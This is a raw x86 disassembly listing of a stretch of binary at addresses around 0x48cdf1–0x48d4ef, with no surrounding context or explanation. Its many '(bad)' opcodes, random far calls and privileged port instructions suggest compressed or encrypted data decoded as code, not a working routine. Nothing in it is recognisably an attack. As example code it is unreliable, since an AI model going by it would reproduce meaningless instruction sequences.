  48cdf1:	inc    DWORD PTR [edi-0x35539728]
  48cdf7:	(bad)  
  48cdf8:	das    
  48cdf9:	shr    BYTE PTR [edx-0x28a1cb4a],0x80
  48ce00:	mov    edx,0xdf3f89ad
  48ce05:	xor    DWORD PTR [eax],esp
  48ce07:	adc    DWORD PTR [ecx+0x75],esp
  48ce0a:	xchg   DWORD PTR [edi],edx
  48ce0c:	fld    TBYTE PTR [edx+0x37975db0]
  48ce12:	pop    ds
  48ce13:	mov    WORD PTR [bx+si-0x48],fs
  48ce17:	or     ebx,edi
  48ce19:	xor    DWORD PTR [edi],ebx
  48ce1b:	adc    al,0xa5
  48ce1e:	push   ebp
  48ce1f:	pop    ss
  48ce20:	mov    bh,0x2c
  48ce22:	lods   al,BYTE PTR ds:[esi]
  48ce23:	loope  0x48ce85
  48ce25:	mov    ch,BYTE PTR [edi-0x4f8e1df1]
  48ce2b:	stos   BYTE PTR es:[edi],al
  48ce2c:	aaa    
  48ce2d:	jg     0x48ce31
  48ce2f:	inc    edi
  48ce30:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  48ce32:	inc    edx
  48ce33:	aaa    
  48ce34:	out    0x38,eax
  48ce36:	push   ecx
  48ce37:	sub    DWORD PTR [esi+0x41],esp
  48ce3a:	pop    edi
  48ce3b:	mov    ch,0x8
  48ce3d:	sub    eax,0x69bf07ad
  48ce42:	push   ebp
  48ce43:	ins    BYTE PTR es:[edi],dx
  48ce44:	mov    ah,0xdf
  48ce46:	pop    ss
  48ce47:	adc    BYTE PTR [esi+0x5a],cl
  48ce4a:	inc    esp
  48ce4b:	xchg   DWORD PTR [esi+0x45],eax
  48ce4e:	pop    edx
  48ce4f:	mov    al,ds:0x17174f0a
  48ce54:	push   es
  48ce55:	push   0x2f384c81
  48ce5a:	aad    0xc2
  48ce5c:	and    bh,BYTE PTR [edx+0x15570f36]
  48ce62:	add    DWORD PTR [eax+ebp*2-0x7caae0f1],ebp
  48ce69:	mov    al,ds:0xb0586710
  48ce6e:	call   0x8a8b:0x4b7cfac
  48ce75:	js     0x48ce1e
  48ce77:	pop    ss
  48ce78:	lahf   
  48ce79:	and    ah,BYTE PTR [edx-0x7f]
  48ce7c:	or     al,0x34
  48ce7e:	pop    ss
  48ce7f:	leave  
  48ce80:	jne    0x48cec3
  48ce82:	sar    bh,0x43
  48ce85:	or     DWORD PTR [ecx+0x3617222e],edi
  48ce8b:	ins    BYTE PTR es:[edi],dx
  48ce8c:	sub    eax,0x105f186a
  48ce91:	dec    eax
  48ce92:	and    edi,edx
  48ce94:	fbstp  TBYTE PTR [eax+edx*2]
  48ce97:	xchg   ebx,eax
  48ce98:	pop    edx
  48ce99:	push   esp
  48ce9a:	fild   WORD PTR [edi+0x15]
  48ce9d:	outs   dx,BYTE PTR ds:[esi]
  48ce9e:	xor    BYTE PTR [ecx-0x11],ch
  48cea1:	iret   
  48cea2:	mov    bh,0x16
  48cea4:	pop    ecx
  48cea5:	mov    ds:0x4e130f61,eax
  48ceaa:	pop    ebp
  48ceab:	push   0x17
  48cead:	ja     0x48cf26
  48ceaf:	dec    edi
  48ceb0:	adc    esp,ebx
  48ceb2:	add    dh,BYTE PTR [edi+eax*1+0x707280ab]
  48ceb9:	out    0x32,eax
  48cebb:	dec    edi
  48cebc:	or     eax,0x6f6b011d
  48cec1:	dec    edi
  48cec2:	nop
  48cec3:	or     ch,BYTE PTR [ecx-0x5698c02b]
  48cec9:	push   ecx
  48ceca:	adc    DWORD PTR [eax+0xf],0xffffff8a
  48cece:	ja     0x48cf2a
  48ced0:	and    dl,BYTE PTR [eax+esi*2]
  48ced3:	(bad)  
  48ced4:	pop    ds
  48ced5:	mov    bh,0x8
  48ced7:	xchg   ebp,eax
  48ced8:	and    dh,BYTE PTR [eax+0x3604cd3f]
  48cede:	dec    ebx
  48cedf:	or     ebp,DWORD PTR [edi-0x7f2a9ea2]
  48cee5:	dec    edi
  48cee6:	jg     0x48cf1b
  48cee8:	adc    ecx,eax
  48ceea:	stos   BYTE PTR es:[edi],al
  48ceeb:	xor    al,0xbf
  48ceed:	bound  esi,QWORD PTR [di-0x5949]
  48cef2:	das    
  48cef3:	shr    DWORD PTR [edi-0x1e39ec5f],cl
  48cef9:	aas    
  48cefa:	push   esi
  48cefb:	inc    edi
  48cefc:	rcl    BYTE PTR [esi+0x4c],1
  48ceff:	add    bh,ah
  48cf01:	(bad)  
  48cf02:	lea    edx,[ebp+0x48]
  48cf05:	and    BYTE PTR [edi-0x4a],dh
  48cf08:	mov    edx,0xef0a0d08
  48cf0d:	xchg   DWORD PTR [eax+ecx*2-0x7898deac],eax
  48cf14:	test   eax,0x6f6a12a4
  48cf19:	mov    dl,0x31
  48cf1b:	pusha  
  48cf1c:	mov    WORD PTR [eax+0x11],?
  48cf1f:	sti    
  48cf20:	mov    dh,0xa1
  48cf22:	pop    ebx
  48cf23:	aam    0xa
  48cf25:	jg     0x48cf66
  48cf27:	rol    DWORD PTR [edx-0x15],0x18
  48cf2b:	(bad)  
  48cf2c:	aas    
  48cf2d:	mov    BYTE PTR [esp+edx*4+0xa],0x8c
  48cf32:	out    0x77,eax
  48cf34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48cf35:	scas   al,BYTE PTR es:[edi]
  48cf36:	dec    esi
  48cf37:	sub    BYTE PTR [edi+0x2142db38],al
  48cf3d:	popf   
  48cf3e:	aas    
  48cf3f:	jg     0x48ced8
  48cf41:	add    BYTE PTR [ebx+0x39cb7d22],dl
  48cf47:	(bad)  
  48cf48:	xor    al,BYTE PTR ds:0x470dd636
  48cf4e:	iret   
  48cf4f:	ins    DWORD PTR es:[edi],dx
  48cf50:	xchg   esi,eax
  48cf51:	icebp  
  48cf52:	mov    BYTE PTR [ebx-0x21],ah
  48cf55:	in     al,dx
  48cf56:	xor    bl,BYTE PTR [ebx+0x3f31067c]
  48cf5c:	inc    ecx
  48cf5d:	inc    esi
  48cf5e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48cf5f:	jo     0x48cfd0
  48cf61:	adc    eax,0x2717d76e
  48cf66:	inc    edx
  48cf67:	lods   al,BYTE PTR ds:[esi]
  48cf68:	push   ebp
  48cf69:	jmp    0x48cefd
  48cf6b:	push   DWORD PTR [edi]
  48cf6d:	add    eax,0x6f70bb5f
  48cf72:	fbstp  TBYTE PTR [ebx+0x6c3c310f]
  48cf78:	pop    eax
  48cf79:	aas    
  48cf7a:	pop    edi
  48cf7b:	dec    edi
  48cf7c:	xchg   BYTE PTR [ebx+0x4],ch
  48cf7f:	add    al,BYTE PTR [edi+0x7182ff32]
  48cf85:	imul   ebp,DWORD PTR [ebx+esi*2+0x6d72e005],0xad72b347
  48cf90:	bound  edx,QWORD PTR [eax]
  48cf92:	cmp    edi,DWORD PTR [edi+0x7f]
  48cf95:	outs   dx,BYTE PTR ds:[esi]
  48cf96:	in     eax,dx
  48cf97:	jbe    0x48cff9
  48cf99:	idiv   DWORD PTR [edi+0x42]
  48cf9c:	pop    ss
  48cf9d:	(bad)  
  48cf9f:	sub    BYTE PTR [ebx],0xf8
  48cfa2:	xchg   edi,eax
  48cfa3:	inc    ebp
  48cfa4:	mov    DWORD PTR [ecx+0x17],0x2b4b3d44
  48cfab:	mov    DWORD PTR [edi-0xc],0xc7d07002
  48cfb2:	xor    BYTE PTR [edi+0x42],cl
  48cfb5:	bound  eax,QWORD PTR [edx+0xf368431]
  48cfbb:	and    cl,BYTE PTR [edi+0x2fb71144]
  48cfc1:	dec    ebx
  48cfc2:	xor    DWORD PTR [ecx-0x7f],edx
  48cfc5:	shl    BYTE PTR [edi-0x169f9ebf],0x94
  48cfcc:	lahf   
  48cfcd:	pop    ss
  48cfce:	xor    cl,bl
  48cfd0:	mov    edx,0x9ec721d4
  48cfd5:	pop    eax
  48cfd6:	and    DWORD PTR [edx],esp
  48cfd8:	adc    DWORD PTR [edi+0x28c406b],eax
  48cfde:	or     BYTE PTR [edi+0x1a],dh
  48cfe1:	add    eax,0x454f215d
  48cfe6:	test   edx,0x17118268
  48cfec:	push   es
  48cfed:	push   cs
  48cfee:	fsub   QWORD PTR [edx+0x158b6b37]
  48cff4:	push   ecx
  48cff5:	mov    DWORD PTR [ecx+0x67],edx
  48cff8:	cmovb  ebx,DWORD PTR [ebx]
  48cffb:	mov    eax,0xbf36cf6c
  48d000:	jp     0x48cfb4
  48d002:	mov    dh,0x81
  48d004:	aaa    
  48d005:	xchg   edi,ecx
  48d007:	fstp   DWORD PTR [edx+0x73]
  48d00a:	sub    DWORD PTR [edi],esp
  48d00c:	push   edi
  48d00d:	(bad)  
  48d00e:	mov    ah,0x81
  48d010:	push   ecx
  48d011:	shr    esi,0x2f
  48d014:	push   ebp
  48d015:	jo     0x48cfdd
  48d017:	and    ah,BYTE PTR [edi-0x1a]
  48d01a:	xchg   edi,eax
  48d01b:	or     ch,BYTE PTR ss:[esi+esi*1]
  48d01f:	xor    edi,ecx
  48d021:	push   edi
  48d022:	pop    edi
  48d023:	xor    dl,BYTE PTR [ecx]
  48d025:	cmp    al,0xac
  48d027:	fld    TBYTE PTR [edi]
  48d029:	inc    esp
  48d02a:	sub    BYTE PTR [ecx+0x673555d8],bh
  48d030:	inc    edx
  48d031:	cmp    BYTE PTR [edx],0x58
  48d034:	aad    0x37
  48d036:	not    DWORD PTR [edx+0x28]
  48d039:	je     0x48cfc6
  48d03b:	xlat   BYTE PTR ds:[ebx]
  48d03c:	adc    edi,DWORD PTR [ecx]
  48d03e:	bts    DWORD PTR [ebp+0x47d70cd5],ebp
  48d045:	adc    ecx,DWORD PTR [edx]
  48d047:	adc    BYTE PTR [ebx+0x6e],al
  48d04a:	pop    DWORD PTR [ebp-0x19]
  48d04d:	arpl   WORD PTR [eax],sp
  48d04f:	shl    DWORD PTR [eax-0x5894bca1],cl
  48d055:	inc    ebp
  48d056:	and    eax,0xe6df229f
  48d05b:	(bad)  
  48d05c:	push   cs
  48d05d:	nop
  48d05e:	inc    ebx
  48d05f:	inc    ebp
  48d060:	inc    edi
  48d061:	inc    ebx
  48d062:	inc    edi
  48d063:	and    al,bl
  48d065:	push   ss
  48d066:	lods   eax,DWORD PTR ds:[esi]
  48d067:	pop    edi
  48d068:	inc    edi
  48d069:	outs   dx,DWORD PTR ds:[esi]
  48d06a:	inc    ebp
  48d06b:	ins    DWORD PTR es:[edi],dx
  48d06c:	adc    BYTE PTR [eax-0x3eb8dfc9],dh
  48d072:	inc    ecx
  48d073:	push   edi
  48d074:	cmp    BYTE PTR [edi+0x38],ah
  48d077:	stos   DWORD PTR es:[edi],eax
  48d078:	mov    ecx,es
  48d07a:	jo     0x48d0b1
  48d07c:	xchg   DWORD PTR [ebx+0x4162b6de],esi
  48d082:	(bad)  
  48d083:	aaa    
  48d084:	xchg   edi,eax
  48d085:	dec    ecx
  48d086:	jae    0x48d0d5
  48d088:	mov    dh,0xa7
  48d08a:	xor    eax,DWORD PTR [ebx+edx*1+0x4b]
  48d08e:	mov    WORD PTR [eax-0x71],ds
  48d091:	mov    edi,0x5c111b43
  48d096:	sbb    al,0xdf
  48d098:	inc    esi
  48d099:	pop    ss
  48d09a:	call   0x1217:0x82235e0a
  48d0a1:	pop    ss
  48d0a2:	adc    al,0xd2
  48d0a4:	inc    eax
  48d0a5:	xor    BYTE PTR ds:[eax],al
  48d0a8:	cmp    DWORD PTR [edi+0x18e9902d],edi
  48d0ae:	out    0x34,eax
  48d0b0:	mov    ds:0x2fc0ade4,eax
  48d0b5:	aaa    
  48d0b6:	inc    si
  48d0b8:	mov    al,BYTE PTR [eax+0x675e16d1]
  48d0be:	pop    ds
  48d0bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d0c0:	mov    eax,ebx
  48d0c2:	shr    BYTE PTR [edi+0xe5c7743],0xa
  48d0c9:	mov    es,WORD PTR [ebx+0x2f]
  48d0cc:	inc    esi
  48d0cd:	xor    DWORD PTR [ebx-0x52],eax
  48d0d0:	fiadd  DWORD PTR [ebp+0x2306745]
  48d0d6:	shl    BYTE PTR [edx-0x7100f8fb],0x1b
  48d0dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d0de:	xor    eax,0x4743d7ef
  48d0e3:	mov    edx,0x3b2ded46
  48d0e8:	(bad)  
  48d0e9:	ja     0x48d0bc
  48d0eb:	adc    BYTE PTR ds:0x767381b,0xff
  48d0f2:	call   0x69bf:0x32472d6c
  48d0f9:	in     eax,dx
  48d0fa:	sub    al,0x45
  48d0fd:	push   DWORD PTR [eax]
  48d0ff:	inc    edi
  48d100:	dec    edx
  48d101:	jmp    0x41d7:0xc347ab02
  48d108:	or     DWORD PTR [ecx],eax
  48d10a:	and    edi,0xd1562685
  48d110:	inc    esp
  48d111:	outs   dx,DWORD PTR ds:[esi]
  48d112:	push   edi
  48d113:	stos   DWORD PTR es:[edi],eax
  48d114:	loopne 0x48d0bb
  48d116:	imul   eax,DWORD PTR [edi],0x5b
  48d119:	outs   dx,DWORD PTR ds:[esi]
  48d11a:	adc    DWORD PTR [esi],edx
  48d11c:	enter  0x43b5,0x47
  48d120:	cmp    BYTE PTR [edx+0x34],bl
  48d123:	mov    BYTE PTR [ebp-0x4fe09056],dl
  48d129:	or     ch,ah
  48d12b:	es jg  0x48d0c5
  48d12e:	mov    esp,0x978a0b4c
  48d133:	ja     0x48d154
  48d135:	mov    eax,0x27611a91
  48d13a:	xchg   DWORD PTR [edx+0x3f30a2e0],edi
  48d140:	inc    ecx
  48d141:	adc    BYTE PTR [eax+0x4347c8a9],al
  48d147:	sbb    DWORD PTR [ebx+0x55],eax
  48d14a:	stos   BYTE PTR es:[edi],al
  48d14b:	outs   dx,DWORD PTR ds:[esi]
  48d14c:	pop    ds
  48d14d:	inc    esi
  48d14e:	adc    eax,0x77897b16
  48d153:	pop    es
  48d154:	mov    bh,0x7e
  48d156:	mov    ds:0x278d2156,al
  48d15b:	outs   dx,BYTE PTR ds:[esi]
  48d15c:	jge    0x48d141
  48d15e:	push   0xffffff8f
  48d160:	inc    esi
  48d161:	mov    bh,0xcf
  48d163:	pop    edx
  48d164:	add    eax,0xc3a7b68c
  48d169:	stos   DWORD PTR es:[edi],eax
  48d16a:	cwde   
  48d16b:	pop    edx
  48d16c:	fsub   QWORD PTR [edi+0x5f]
  48d16f:	jno    0x48d126
  48d171:	and    dl,BYTE PTR [eax]
  48d173:	ja     0x48d11c
  48d175:	push   ecx
  48d176:	ret    
  48d177:	nop
  48d178:	test   al,0xb7
  48d17a:	inc    edi
  48d17b:	inc    ebp
  48d17c:	and    eax,0x976209ac
  48d181:	xor    edx,DWORD PTR [edi+0x53090e84]
  48d187:	xor    edi,esp
  48d189:	push   0x37
  48d18b:	icebp  
  48d18c:	or     eax,0x55621ffb
  48d191:	pop    eax
  48d192:	jo     0x48d19b
  48d194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d195:	(bad)  
  48d196:	cmp    dh,BYTE PTR [ebp-0x5d40c8fe]
  48d19c:	test   BYTE PTR [ecx+ebx*2+0x2b453f0f],dh
  48d1a3:	adc    al,0xdc
  48d1a5:	iret   
  48d1a6:	aaa    
  48d1a7:	mov    DWORD PTR ds:0x176d6cc1,0x5d8f355f
  48d1b1:	mov    eax,ds:0x6f34d608
  48d1b6:	aas    
  48d1b7:	xlat   BYTE PTR ds:[ebx]
  48d1b8:	jo     0x48d20a
  48d1ba:	and    esp,edi
  48d1bc:	xor    DWORD PTR [edi+0x45],esp
  48d1bf:	xchg   ebp,eax
  48d1c0:	ror    BYTE PTR [esi+0x30a70721],0xd8
  48d1c7:	dec    esi
  48d1c8:	imul   esp,edi,0x4f
  48d1cb:	bound  esp,QWORD PTR [edx-0x3b]
  48d1ce:	adc    eax,0x5877779f
  48d1d3:	(bad)  
  48d1d4:	fist   DWORD PTR [ecx-0x754e8c69]
  48d1da:	adc    al,0x8d
  48d1dc:	aaa    
  48d1dd:	daa    
  48d1de:	outs   dx,DWORD PTR ds:[esi]
  48d1df:	add    eax,0x3710eb4f
  48d1e4:	ja     0x48d1ed
  48d1e6:	sub    al,0x4a
  48d1e8:	and    ebp,DWORD PTR ds:0x8159ff7
  48d1ee:	adc    eax,0xf7ffa60f
  48d1f3:	sbb    ecx,DWORD PTR [ebx+0x6e]
  48d1f6:	outs   dx,DWORD PTR ds:[esi]
  48d1f7:	pop    ss
  48d1f8:	pop    DWORD PTR [ebx-0x54]
  48d1fb:	shr    BYTE PTR [ebx+0x50],1
  48d1fe:	pop    ds
  48d1ff:	mov    esi,0x989ba497
  48d204:	bound  ecx,QWORD PTR [edi]
  48d206:	cmp    DWORD PTR [esi],esp
  48d208:	xor    ah,BYTE PTR [edx]
  48d20a:	add    BYTE PTR [edi],0x62
  48d20d:	inc    ecx
  48d20e:	and    ecx,DWORD PTR [edx-0x2156de8d]
  48d214:	inc    esp
  48d215:	outs   dx,DWORD PTR ds:[esi]
  48d216:	push   edx
  48d217:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d218:	test   DWORD PTR [edi],esi
  48d21a:	push   0xffffff8c
  48d21c:	xlat   BYTE PTR ds:[ebx]
  48d21d:	psrlw  mm0,QWORD PTR [eax]
  48d220:	inc    edx
  48d221:	and    eax,DWORD PTR [edi+0x73]
  48d224:	popa   
  48d225:	sbb    eax,0x7bd75f8b
  48d22a:	inc    ebx
  48d22b:	lds    esp,FWORD PTR [edx+ebp*1+0x5b]
  48d22f:	aaa    
  48d230:	xor    ah,bh
  48d232:	mov    al,0xe
  48d234:	push   ecx
  48d235:	pop    es
  48d236:	cmp    DWORD PTR [edi-0x8],ecx
  48d239:	push   ss
  48d23a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d23b:	jbe    0x48d2a0
  48d23d:	aas    
  48d23e:	inc    edi
  48d23f:	aas    
  48d240:	cmp    DWORD PTR [ebx-0x48dd1b30],edx
  48d246:	inc    ecx
  48d247:	sub    ch,BYTE PTR [eax+0x6d]
  48d24a:	sub    DWORD PTR [edi],0xffffff8f
  48d24d:	pop    es
  48d24e:	loopne 0x48d286
  48d250:	push   ss
  48d251:	(bad)  
  48d252:	neg    DWORD PTR [edi]
  48d254:	test   DWORD PTR [ebx],ebx
  48d256:	popf   
  48d257:	ret    0x8b5f
  48d25a:	ja     0x48d291
  48d25c:	jmp    0x30a7:0x36a756a8
  48d263:	fcmovbe st,st(0)
  48d265:	mov    DWORD PTR [edi+0x122a6f31],ebx
  48d26b:	add    eax,esi
  48d26d:	pop    ds
  48d26e:	xlat   BYTE PTR ds:[ebx]
  48d26f:	dec    edi
  48d270:	les    ebp,FWORD PTR [eax+0x623f1510]
  48d276:	push   ebx
  48d277:	mov    cl,0x1
  48d279:	and    eax,DWORD PTR [edi+0x39]
  48d27c:	addr16 sbb al,0x58
  48d27f:	pop    es
  48d280:	mov    cl,0x4f
  48d282:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d283:	test   DWORD PTR [ebp-0x6e],eax
  48d286:	push   esi
  48d287:	pop    ds
  48d288:	ins    DWORD PTR es:[edi],dx
  48d289:	add    al,0x47
  48d28b:	xor    esp,DWORD PTR [edi+0x41]
  48d28e:	out    0x6f,eax
  48d290:	inc    ebx
  48d291:	pop    edx
  48d292:	mov    al,0x8e
  48d294:	(bad)  
  48d295:	dec    DWORD PTR [esi+eiz*2]
  48d298:	push   ebx
  48d299:	test   eax,0x1612273f
  48d29e:	xchg   edi,eax
  48d29f:	add    DWORD PTR [edi+0x2d],ecx
  48d2a2:	cdq    
  48d2a3:	fisubr DWORD PTR [eax]
  48d2a5:	ja     0x48d296
  48d2a7:	inc    esp
  48d2a8:	ins    DWORD PTR es:[edi],dx
  48d2a9:	pop    eax
  48d2aa:	mov    ebx,0x17318f02
  48d2af:	fisttp WORD PTR [ebx-0x55]
  48d2b2:	es mov cl,0xe7
  48d2b5:	ja     0x48d259
  48d2b7:	push   ebp
  48d2b8:	lods   eax,DWORD PTR ds:[esi]
  48d2b9:	dec    esi
  48d2ba:	dec    edi
  48d2bb:	aaa    
  48d2bc:	lahf   
  48d2bd:	aad    0x69
  48d2bf:	add    BYTE PTR [edi],dh
  48d2c1:	into   
  48d2c2:	fild   QWORD PTR [edx+0x7b82dc00]
  48d2c8:	(bad)  
  48d2c9:	fistp  WORD PTR [edx]
  48d2cb:	mov    dh,0x55
  48d2cd:	cwde   
  48d2ce:	xor    DWORD PTR [edi],edi
  48d2d0:	and    edx,DWORD PTR [edi-0x4fec5554]
  48d2d6:	push   cs
  48d2d7:	jg     0x48d2f1
  48d2d9:	adc    eax,DWORD PTR [esp+esi*2+0x54057f1f]
  48d2e0:	es add al,bh
  48d2e3:	div    BYTE PTR ds:0x22d6222d
  48d2e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d2ea:	call   FWORD PTR [eax-0x29]
  48d2ed:	xor    eax,0x341743e0
  48d2f2:	(bad)  
  48d2f3:	mov    al,ds:0xe7eb0915
  48d2f8:	pop    es
  48d2f9:	test   al,0x92
  48d2fb:	push   esi
  48d2fc:	add    DWORD PTR [edi-0x21],ebp
  48d2ff:	je     0x48d2b6
  48d301:	xchg   edx,eax
  48d302:	inc    edx
  48d303:	(bad)  
  48d304:	fwait
  48d305:	xchg   ebx,eax
  48d306:	push   es
  48d307:	arpl   WORD PTR [edi],sp
  48d309:	out    0x56,eax
  48d30b:	cmp    BYTE PTR [eax-0x3d],ah
  48d30e:	xchg   esi,eax
  48d30f:	dec    ebx
  48d310:	inc    edi
  48d312:	sbb    edi,DWORD PTR [bx+si+0x60da]
  48d317:	out    0x7b,eax
  48d319:	push   ecx
  48d31a:	push   edx
  48d31b:	or     BYTE PTR [edx-0x61],ch
  48d31e:	xor    DWORD PTR [edx+ebx*2],ebx
  48d321:	stos   DWORD PTR es:[edi],eax
  48d322:	xchg   edi,eax
  48d323:	jg     0x48d2bc
  48d325:	ret    0x8302
  48d328:	dec    eax
  48d329:	retf   
  48d32a:	in     al,0xda
  48d32c:	lods   eax,DWORD PTR ds:[esi]
  48d32d:	cwde   
  48d32e:	pop    ds
  48d32f:	jle    0x48d388
  48d331:	cmp    BYTE PTR [ecx-0x49],ch
  48d334:	add    eax,0x6ab4cf0c
  48d339:	inc    ebp
  48d33a:	add    BYTE PTR [edi+0x4f],dh
  48d33d:	imul   edx,DWORD PTR [ebp+0x13],0x4247c70b
  48d344:	int    0xd6
  48d346:	xor    al,0x77
  48d348:	xor    esi,DWORD PTR [edi]
  48d34a:	lea    ebx,[ebp-0x27]
  48d34d:	xor    DWORD PTR [edi],0xccc90fdf
  48d353:	(bad)  
  48d354:	stos   BYTE PTR es:[edi],al
  48d355:	mov    DWORD PTR [edi],0xac1c145
  48d35b:	add    al,BYTE PTR [edi-0x7296781d]
  48d361:	xor    dl,BYTE PTR [esi-0x11]
  48d364:	adc    DWORD PTR [ebp-0x5460aee0],edx
  48d36a:	jg     0x48d3a2
  48d36c:	sub    BYTE PTR [eax+0x4ff73777],al
  48d372:	(bad)  
  48d373:	push   ds
  48d374:	mov    esi,0xab5b0409
  48d379:	adc    BYTE PTR [ecx+0x582f0248],ch
  48d37f:	or     eax,DWORD PTR [ecx+esi*2+0x1069d7cf]
  48d386:	fiadd  DWORD PTR [edx]
  48d388:	xchg   edi,eax
  48d389:	xchg   DWORD PTR [esi],edx
  48d38b:	fcom   st(6)
  48d38d:	ins    BYTE PTR es:[edi],dx
  48d38e:	lods   al,BYTE PTR ds:[esi]
  48d38f:	pop    edi
  48d390:	das    
  48d391:	xchg   DWORD PTR [eax],ecx
  48d393:	shr    BYTE PTR [edx-0x7978b013],cl
  48d399:	or     BYTE PTR [ebp-0x54],ch
  48d39c:	div    DWORD PTR [edi]
  48d39e:	inc    ebx
  48d39f:	ins    BYTE PTR es:[edi],dx
  48d3a0:	lds    ebp,FWORD PTR [edx+0x49]
  48d3a3:	das    
  48d3a4:	iret   
  48d3a5:	idiv   DWORD PTR [esp+ebp*4]
  48d3a8:	enter  0x43d6,0x57
  48d3ac:	inc    ebx
  48d3ad:	xor    BYTE PTR [ecx],cl
  48d3af:	dec    eax
  48d3b0:	adc    eax,0x1484c797
  48d3b5:	(bad)  
  48d3b6:	jno    0x48d3fd
  48d3b8:	pop    es
  48d3b9:	inc    edi
  48d3ba:	sub    eax,0xf7468b00
  48d3bf:	push   es
  48d3c0:	dec    esp
  48d3c1:	pop    es
  48d3c2:	push   esi
  48d3c3:	neg    DWORD PTR [edi+0x39]
  48d3c6:	ja     0x48d3f0
  48d3c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d3c9:	jo     0x48d37f
  48d3cb:	ja     0x48d44c
  48d3cd:	ror    BYTE PTR [eax-0x3e082df8],0x82
  48d3d4:	or     ebp,DWORD PTR [ebx-0x39]
  48d3d7:	outs   dx,DWORD PTR ds:[esi]
  48d3d8:	retf   0x2d6f
  48d3db:	fdiv   DWORD PTR [ebp+0x26df4247]
  48d3e1:	pop    es
  48d3e2:	ror    BYTE PTR [ecx+0x6d],cl
  48d3e5:	ja     0x48d3a6
  48d3e7:	outs   dx,DWORD PTR ds:[esi]
  48d3e8:	push   es
  48d3e9:	lds    edx,FWORD PTR [ecx]
  48d3eb:	arpl   WORD PTR [edi],sp
  48d3ed:	xor    DWORD PTR [edi],edx
  48d3ef:	daa    
  48d3f0:	add    bl,ah
  48d3f2:	and    bl,bh
  48d3f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d3f5:	dec    esi
  48d3f6:	inc    edx
  48d3f7:	pop    eax
  48d3f8:	leave  
  48d3f9:	cmp    DWORD PTR [edi-0x252c3dd7],esi
  48d3ff:	test   DWORD PTR [edi-0x61],0x10ab88c4
  48d406:	dec    edi
  48d407:	xor    BYTE PTR [edi],cl
  48d409:	aad    0x40
  48d40b:	or     BYTE PTR [edi],ch
  48d40d:	(bad)  
  48d40e:	sub    BYTE PTR [bp-0x7950],ah
  48d413:	mov    DWORD PTR [edi],0x382b4bad
  48d419:	xor    al,0x5f
  48d41b:	push   edi
  48d41c:	xchg   edx,eax
  48d41d:	mov    ?,WORD PTR [esi-0x5f]
  48d420:	dec    edi
  48d421:	es dec edi
  48d423:	xor    BYTE PTR [ebx+0x7f55484b],ch
  48d429:	scas   eax,DWORD PTR es:[edi]
  48d42a:	sub    ah,BYTE PTR [esp+ebx*8]
  48d42d:	add    edi,DWORD PTR [esi+0x6e]
  48d430:	xchg   edi,eax
  48d431:	sbb    BYTE PTR [ebx],ah
  48d433:	xchg   esi,eax
  48d434:	adc    BYTE PTR [edi],ch
  48d436:	mov    al,0x3a
  48d438:	sub    DWORD PTR [edi+eax*1+0x6042839f],ebp
  48d43f:	xchg   ecx,eax
  48d440:	jg     0x48d439
  48d442:	jmp    0x48d3e8
  48d444:	scas   al,BYTE PTR es:[edi]
  48d445:	sbb    DWORD PTR [edi-0x369df8cc],ebp
  48d44b:	je     0x48d455
  48d44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d44e:	xor    eax,0x28708740
  48d453:	(bad)  
  48d454:	iret   
  48d455:	adc    dh,bl
  48d457:	daa    
  48d458:	sbb    bl,0x7b
  48d45b:	(bad)  
  48d45c:	ret    0xea51
  48d45f:	mov    edi,0x8666afaf
  48d464:	push   0x62
  48d466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d467:	inc    ebx
  48d468:	xchg   edi,eax
  48d469:	mov    bh,0xe0
  48d46b:	pop    ecx
  48d46c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d46d:	mov    edx,DWORD PTR [edi+0x6c3c7737]
  48d473:	dec    ebx
  48d474:	mov    esi,0x47bf43cf
  48d479:	test   DWORD PTR ds:0x4df70521,edx
  48d47f:	(bad)  
  48d480:	xor    eax,0x6f
  48d483:	aaa    
  48d484:	iret   
  48d485:	inc    edx
  48d486:	or     DWORD PTR [edi+0x6d],ebp
  48d489:	aas    
  48d48a:	mov    ebx,0x28561ccf
  48d48f:	sub    eax,0x5b860b17
  48d494:	test   DWORD PTR [esi-0x7668e529],esp
  48d49a:	jge    0x48d4ae
  48d49c:	and    edx,DWORD PTR [edi]
  48d49e:	daa    
  48d49f:	inc    edx
  48d4a0:	and    dh,BYTE PTR [edx]
  48d4a2:	test   BYTE PTR [edi],dh
  48d4a4:	(bad)  
  48d4a5:	cmp    eax,0xef4badac
  48d4aa:	fistp  WORD PTR [ebx]
  48d4ac:	rol    DWORD PTR [ebp+0x8],0xa1
  48d4b0:	fist   WORD PTR [edi+0x6d841b48]
  48d4b6:	imul   ecx,edi,0x18
  48d4b9:	push   esi
  48d4ba:	dec    eax
  48d4bb:	cmp    eax,0xc3c7a70b
  48d4c0:	mov    ds:0x76e7b582,al
  48d4c5:	popf   
  48d4c6:	ret    0x87aa
  48d4c9:	xchg   DWORD PTR [edi],esp
  48d4cb:	dec    ebx
  48d4cd:	aam    0xdb
  48d4cf:	test   bh,bl
  48d4d1:	push   edi
  48d4d2:	cmp    dl,bl
  48d4d4:	xchg   edx,eax
  48d4d5:	out    0x1e,al
  48d4d7:	cmp    DWORD PTR ss:[edi+0x46],ebx
  48d4db:	sbb    ah,BYTE PTR [esp+edx*2+0x27e7cf18]
  48d4e2:	push   esi
  48d4e3:	and    DWORD PTR [eax],esi
  48d4e5:	xchg   edi,eax
  48d4e6:	lahf   
  48d4e7:	ins    DWORD PTR es:[edi],dx
  48d4e8:	sbb    al,0x19
  48d4ea:	pop    ss
  48d4eb:	inc    esi
  48d4ec:	add    edx,DWORD PTR [edx+0x68]
  48d4ef:	adc    dl,BYTE PTR [esi-0x29]
